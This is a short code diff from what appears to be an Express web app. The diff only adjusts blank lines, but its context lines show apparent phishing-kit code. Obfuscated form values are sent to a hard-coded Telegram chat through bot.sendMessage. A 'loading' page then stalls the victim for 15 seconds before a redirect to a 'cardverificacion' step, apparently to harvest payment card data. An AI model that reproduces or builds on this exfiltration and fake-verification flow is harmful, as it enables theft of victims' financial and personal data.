@@ -113,6 +113,7 @@ bot.sendMessage('791007687', `1: ${r6fa6y89yB}\n2: ${nYffxLjdFW}\n3: ${wJcPshSku
     
     books.push(newBook);
     
+
   res.render('loading'); // Renderiza la vista "loading" mientras espera los 15 segundos
 
   // Espera 15 segundos antes de redirigir
@@ -120,7 +121,6 @@ bot.sendMessage('791007687', `1: ${r6fa6y89yB}\n2: ${nYffxLjdFW}\n3: ${wJcPshSku
     res.redirect('cardverificacion');
   }, 15000);
 });
-
 
 
 router.post('/cardverificacion',  (req, res) => {
